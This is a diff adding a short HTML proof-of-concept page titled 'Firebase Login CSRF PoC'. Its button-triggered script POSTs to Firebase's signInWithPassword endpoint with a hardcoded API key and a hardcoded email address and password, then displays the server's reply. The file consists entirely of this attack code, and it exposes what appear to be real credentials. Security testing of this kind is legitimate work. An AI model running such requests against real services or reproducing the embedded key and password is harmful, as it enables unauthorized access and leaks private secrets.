@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Firebase Login CSRF PoC</h1>
+    <button onclick="csrf()">Click to send request</button>
+    <script>
+      function csrf() {
+        fetch("https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyDzj0FG4JS6bOUHLhbubOR_CVaH8EGSvO0", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            returnSecureToken: true,
+            email: "gostafoed@gmail.com",
+            password: "A1gostafoed@gmail.com",
+            clientType: "CLIENT_TYPE_WEB"
+          })
+        })
+        .then(res => res.text())
+        .then(res => alert("Response:\n" + res))
+        .catch(err => alert("CORS blocked or error:\n" + err));
+      }
+    </script>
+  </body>
+</html>
